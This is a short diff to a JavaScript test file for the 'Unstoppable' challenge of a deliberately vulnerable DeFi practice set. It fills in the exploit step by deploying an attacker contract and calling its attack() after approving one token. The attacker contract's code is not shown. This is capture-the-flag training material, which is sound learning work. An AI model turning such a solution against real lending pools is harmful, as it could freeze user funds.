@@ -15,9 +15,12 @@ describe('[Challenge] Unstoppable', function () {
 
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
+        const UnstoppableAttackerFactory = await ethers.getContractFactory('UnstoppableAttacker', attacker);
+
 
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
+        this.attackerContract = await UnstoppableAttackerFactory.deploy(this.pool.address, this.token.address);
 
         await this.token.approve(this.pool.address, TOKENS_IN_POOL);
         await this.pool.depositTokens(TOKENS_IN_POOL);
@@ -40,6 +43,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.attackerContract.address, 1);
+        await this.attackerContract.connect(attacker).attack();
     });
 
     after(async function () {
